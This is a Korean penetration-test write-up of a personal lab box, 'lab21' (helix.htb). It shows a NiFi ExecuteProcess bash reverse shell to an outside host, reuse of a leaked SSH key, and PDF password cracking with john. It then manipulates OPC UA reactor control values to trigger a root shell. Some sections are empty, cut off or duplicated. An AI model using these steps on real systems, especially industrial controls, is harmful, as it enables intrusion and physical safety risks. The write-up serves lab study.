---
publish: true
title: 모의해킹 보고서 - lab21
created: 2026-11-19
modified: 2026-11-20T17:58:16.421Z
published: 2026-11-19
date: 2026-11-19
tags:
description:
lab: lab21
---

## 목차

1. [개요](#1-개요)
2. [총평](#2-총평)
3. [정보 수집 대상](#3-정보-수집-대상)
4. [진단결과 요약](#4-진단결과-요약)
5. [모의해킹 수행 내용](#5-모의해킹-수행-내용)
6. [취약점](#6-취약점)

## 1. 개요

본 보고서는 2026년 11월 19일에 진행된 lab21에 대한 모의해킹 보고서이다.

## 2. 총평

이번 lab21 모의해킹에서는
이는 외부에서 시작된 침해가 서버 전체에 대한 통제권 확보로 확대될 수 있음을 보여준다.

보완을 위해

## 3. 정보 수집 대상

개인 실습 서버 lab21을 대상으로 취약점을 점검했다. 대상 서버 lab21의 IP는 자산 보호 차원에서 가려두었다.

## 4. 진단결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점' 섹션에서 확인할 수 있다.

| 취약점 이름 | 위험도 | 설명  | 대응방안 |
| :----: | :-: | :-: | :--: |
|        |     |     |      |
|        |     |     |      |

## 5. 모의해킹 수행 내용 

![[00. Setting/00. 첨부파일/Pasted image 20261118094015.png]]

포트스캔을 해보니 `SSH`와 `HTTP` 포트가 나온다. 도메인 주소는 `helix.htb`

![[00. Setting/00. 첨부파일/Pasted image 20261118094223.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261118094203.png]]

호스트에 주소를 등록해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261118104306.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261118104338.png]]

`gobuster`로 주어진 도메인 주소`helix.htb`로 가상 호스트를 찾아보니 `flow.helix.htb`가 나왔다.

![[00. Setting/00. 첨부파일/Pasted image 20261118094223.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261118104225.png]]

같이 등록해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261118105400.png]]

`flow.helix.htb`를 접속해보니 `nifi`의 주소이다.

`Apache NiFi`: 시스템 사이에서 데이터를 가져오고, 변환하고, 전달하는 흐름을 관리하는 플랫폼

웹서버의 쉘을 얻어보자. 왼상단에 `Add Processor`를 끌어와 빈 화면에 놔주면,

![[00. Setting/00. 첨부파일/Pasted image 20261118105309.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261118105419.png]]

`ExecuteProcess` 프로세서를 추가할 수 있다.

`ExecuteProcess`: 설정한 운영체제 명령을 실행하는 프로세서

![[00. Setting/00. 첨부파일/Pasted image 20261118105726.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261119144358.png]]

![[00. Setting/00. 첨부파일/Pasted image 20261118110106.png]]

```
Command: /bin/bash
Command Arguments: -c,bash -i >& /dev/tcp/[MASK]/4444 0>&1
Argument Delimiter: ,
```

![[00. Setting/00. 첨부파일/Pasted image 20261120045404.png]]

설정에서 리버스쉘을 넣어주고 `LogAttribute`에 연결 후 실행을 해준다.

`Argument Delimiter`: NiFi가 Command Arguments를 여러 인수로 나눌 때 쓰는 문자. 홑따옴표를 써도 됨.

![[00. Setting/00. 첨부파일/Pasted image 20261118110141.png]]

리버스쉘로 원격 접속에 성공했다.

![[00. Setting/00. 첨부파일/Pasted image 20261119144739.png]]

`/opt/nifi-1.21.0/support-bundles` 에 `Operator`의 프라이빗 키가 있다.
내용을 확인해주고,

![[00. Setting/00. 첨부파일/Pasted image 20261118114502.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261118114513.png]]

칼리로 가져온 후 `SSH` 접속을 위해 적당한 권한 부여를 해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261121022511.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261118114618.png]]

프라이빗 키로 `SSH` 접속에 성공했다.

![[00. Setting/00. 첨부파일/Pasted image 20261119091644.png]]

`operator`의 홈에 `'control system diagram.png'`, `'Operator Control & Safty Guide.pdf'` 파일이 있다. 운영 가이드인 것 같으니 읽어보자.

![[00. Setting/00. 첨부파일/Pasted image 20261119092954.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261119093021.png]]

프라이빗 키를 가지고 있으니 `scp`로 kali에 파일을 복사해온다.

![[00. Setting/00. 첨부파일/Pasted image 20261119093222.png]]

```
xdg-open ./Operator\ Control\ \&\ Safety\ Guide.pdf
```

열어보려고 했으나 비밀번호가 설정되어 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261119093528.png]]

```
pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

`pdf2john` 해시를 추출하고 크랙킹한다. 비밀번호를 찾았다 : `operator1`

![[00. Setting/00. 첨부파일/Pasted image 20261119094118.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261119094201.png]]

pdf 파일을 열었다. Helix의 Reactor 운영과 안전 논리 구조에 대해 설명하고 있다.

![[00. Setting/00. 첨부파일/Pasted image 20261119093613.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261119093603.png]]

png도 확인해본다. `OPC UA` 서버가 각 시스템을 운영 중인 내용을 도식화 해놨다. 포트 4840의 로컬 주소를 쓰고 있다.

`OPC UA(Open Platform Communications Unified Architecture)`: 스마트팩토리와 산업 자동화에서 기기·시스템 간 데이터를 주고받기 위해 사용하는 국제 표준(IEC 62541) 통신 아키텍처

![[00. Setting/00. 첨부파일/Pasted image 20261119094606.png]]

로컬 포트 4840으로 다시 `SSH` 원격 접속을 해준다.

![[00. Setting/00. 첨부파일/Pasted image 20261119112149.png]]

`sudo -l` 실행 권한을 확인해보니 `/usr/local/sbin/helix-maint-console`에 인증 없이 접속이 가능하다.

![[00. Setting/00. 첨부파일/Pasted image 20261119154243.png]]

`helix-maint-console` 을 읽어보자.

![[00. Setting/00. 첨부파일/Pasted image 20261119160340.png]]

`if ! window_ok;` : `!` -> 결과를 반대로 바꾼다. 즉, 정비창이 열리는 조건이 실패했을 때,

![[00. Setting/00. 첨부파일/Pasted image 20261120033338.png]]

메세지를 출력한다.

조건이 맞았을 때,

```
echo "[+]Privileged maintenance access granted"
echo "[!]Window expires in ${remaining} seconds"
echo "[!]Session will be terminated automatically"
```

"정비 특권이 승인 되었다"
"창이 {남은 시간}초 후 만료된다"
"세션이 자동으로 종료된다."

세 개의 메세지와 함께 아래 명령이 실행된다.

```
#Launch an interactive root shell attached to THIS TTY, in its own systemd scope 
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
 /bin/bash -p -i
```

- `--quiet`: systemd의 추가 안내 출력을 숨긴다
- `--scope`: 실행한 셸(=root 셸)을 systemd가 관리하는 그룹(scope)에 넣는다.
- `--unit="$SCOPE"`: 그 그룹에 이름을 붙인다(systemd가 root 셸을 추적하고 종료할 때 식별할 이름이 필요).
- `--property=...`: 그룹이 종료될 때 프로세스들을 어떻게 정리할지 지정.
- `KillMode=control-group`: scope가 종료될 때 그 안의 프로세스들도 함께 종료
- `SendSIGHUP=yes`: 종료 신호와 함께 `SIGHUP`을 보내 대화형 셸에 연결 종료를 알림
- `/bin/bash -p -i`: 권한을 유지하는 대화형 Bash를 실행한다.

\=> root 셸을 scope에 넣어, 정비 세션이 종료될 때 그 셸과 하위 프로세스도 함께 정리하고, 정비창이 열려 있는지 확인 후 root 대화형 셸을 실행한다.

`systemd`: Linux에서 부팅 과정과 백그라운드 서비스들을 시작하고 관리하는 시스템 관리자 프로그램
`scope`: systemd가 관련 프로세스들을 한 묶음으로 추적하고 관리하는 실행 단위

![[00. Setting/00. 첨부파일/Pasted image 20261119130454.png]]

전에 복사해온 `Operator Control & Safety Guide.pdf`의 내용 중에 정비창이 열려 있는 조건에 대해 설명하는 부분이 있었다.

```
- 온도가 295℃ 이거나 압력이 73 bar의 근사치여야 한다.
- 압력과 온도가 trip 임계치 미만으로 유지되어야 한다.
- safety trip이 비활성화 되어야 한다.
```

![[00. Setting/00. 첨부파일/Pasted image 20261119095020.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261119095032.png]]

`opcua`는 `python` 패키지이기 때문에 기존 칼리의 `python`과 충돌 나지 않게 가상 환경을 열고

![[00. Setting/00. 첨부파일/Pasted image 20261119095044.png]]

`OPC UA` 클라이언트를 설치 (`OPC UA` 서버에 접속해 데이터 정보 값을 읽고 쓰기 위함)

![[00. Setting/00. 첨부파일/Pasted image 20261119095229.png]]

https://github.com/FreeOpcUa/python-opcua/blob/master/examples/client-minimal.py

OPC UA 클라이언트 라이브러리의 기본 python 코드에 endpoint 주소를 조합해 노드를 탐색한다.

- `get_objects_node()` / `get_children()`: 노드 구조 탐색
- `get_node_class()`와 `get_value()`: 변수 노드의 값 읽기

앞서 열었던 `SSH` 4840 포트 원격 접속이 유효한지 확인 후 코드로 노드와 현재 값을 읽는다. 스크립트는 OPC UA 주소 공간을 탐색해 모든 노드 이름, ID, 그리고 변수 값을 출력한다. -> 너무 시간이 오래 걸려 시간 초과에 걸림

![[00. Setting/00. 첨부파일/Pasted image 20261119100109.png]]

제한 시간을 20초로 늘리고 `objects`(OPC UA의 기본 주소 공간에 있는 표준 폴더) 노드만 일단 확인.

![[00. Setting/00. 첨부파일/Pasted image 20261119100355.png]]

노드 4개 확인. 0번의 노드들은 표준 노드이니 2번의 `Plant`를 살펴본다.

![[00. Setting/00. 첨부파일/Pasted image 20261119100559.png]]

`Plant`의 정확한 분류를 알기 위해 네임스페이스(ns)와 인덱스(i)를 열거해본다.

2번이 `urn:helix:ot` 에 대응하고 `Plant`의 노드도 2번이었으므로 `Plant`는 장치의 `helix ot` 에 속한다.

`OT`: Operational Technology. 기술 운영, 제어 기술

![[00. Setting/00. 첨부파일/Pasted image 20261119100757.png]]

`Plants`의 노드를 훑으면 또 하위 노드가 나온다.

```
Reactor
Safety
Control
```

아까 `PNG` 에서 본 노드다.

![[00. Setting/00. 첨부파일/Pasted image 20261120041710.png]]

`PDF`에서 확인한 정비모드, 안전창 모드 돌입하기 조건.

```
1. Mode를 MAINTENACE로 바꾼다.
2. TestOverride를 활성화한다.
3. CalibarationOffset을 조절한다.
```

![[00. Setting/00. 첨부파일/Pasted image 20261120042134.png]]

`PNG`에서는 `Control` 밑에 `Mode`와 `TestOverride`, `Reactor`에 `CalibrationOffset`이 있다고 했다.

![[00. Setting/00. 첨부파일/Pasted image 20261120041318.png]]

마찬가지로 `Control`에서 인덱스와 노드 상태를 확인해주고

```
Mode: NORMAL
TestOverride: False
ResetTrip: False
```

![[00. Setting/00. 첨부파일/Pasted image 20261120042545.png]]

`Reactor` 노드 하위 노드들의 인덱스와 상태도 확인해준다.

```
 Temperature: 283℃
 Pressure: 68
 CalibrationOffset: 0.0
```

현재는 정상 운전 모드이다. 그럼 정비창을 열기 위해 맞춰야 하는 조건은,

```
Mode: MAINTENANCE
TestOverride: True
Temperature: 295℃ or Pressure: 73
```

그리고 온도와 압력을 변경하기 위해선 `CalibraionOffset`을 조절해야 한다.

![[00. Setting/00. 첨부파일/Pasted image 20261120043224.png]]

`CalibraionOffset` 을 조절할 때엔 점차 높여야 한다. 급격히 높인다면 안전 트립이 발생해 변경 값이 무시된다. -> 다시 정상 운전 모드로 돌아감

![[00. Setting/00. 첨부파일/Pasted image 20261119104821.png]]

정비 모드로 간다. 먼저,

```
Mode: MAINTENANCE
TestOverride: True
```

로 맞춰준다.

![[00. Setting/00. 첨부파일/Pasted image 20261119111739.png]]

`CalibrationOffset`을 조금 높여주고 시험삼아 `/usr/local/sbin/helix-maint-console`을 실행해본다.

![[00. Setting/00. 첨부파일/Pasted image 20261119112226.png]]

조건이 맞지 않아 열리지 않았다는 메세지가 출력된다.

![[00. Setting/00. 첨부파일/Pasted image 20261119130343.png]]

조건이 맞을 때까지 값을 조절해주고,

![[00. Setting/00. 첨부파일/Pasted image 20261119130234.png]]
![[00. Setting/00. 첨부파일/Pasted image 20261119130218.png]]

다시 `sudo` 권한으로 `/usr/local/sbin/helix-maint-console`을 실행해주면 root 쉘이 열렸다.

![[00. Setting/00. 첨부파일/Pasted image 20261120031936.png]]

만료 시간이 지나자 셸이 종료되었다.

## 6. 취약점

```
CVSS v4.0 점수: 10 / Critical
Macro vector: 000100
Exploitability: High
Complexity: High
Vulnerable system: High
Subsequent system: Medium
Exploitation: High
Security requirements: High
```

### 6.1  **NiFi 웹 UI** 인증/권한 제한이 허술

<br> **6.1.1 설명**

- 접속자가 `ExecuteProcess` 같은 프로세서를 구성해 NiFi 서비스 권한으로 명령을 실행하는 것이 가능했다.
- 리버스쉘을 넣어 원격 접속이 가능했다.

<br> **6.1.2 조치방법**

- 명령 실행 등 제한된 컴포넌트의 생성, 수정 권한은 신뢰된 관리자에게만 부여한다.

### 6.2  Support-bundles 안에 포함된 SSH 개인 키

<br> **6.2.1 설명**

- `Support-bundles` 폴더 안에 `operator_id_ed25519.bak` 키가 있었다.
- 개인키를 공격자의 로컬로 가져와 `operator` 계정으로 원격 접속이 가능했다.

<br> **6.2.2 조치방법**

- `Support-bundles` 안에 기존 개인키를 삭제.
- `Support-bundles` 폴더 접근 권한을 제한한다.

### 6.3  root의 권한으로 인증 없이 실행 가능한 서비스

<br> **6.3.1 설명**

- `Support-bundles` 폴더 안에 `operator_id_ed25519.bak` 키가 있었다.

<br> **6.3.2 조치방법**

- `Support-bundles` 안에 기존 개인키를 삭제.
- `Support-bundles` 폴더 접근 권한을 제한한다.
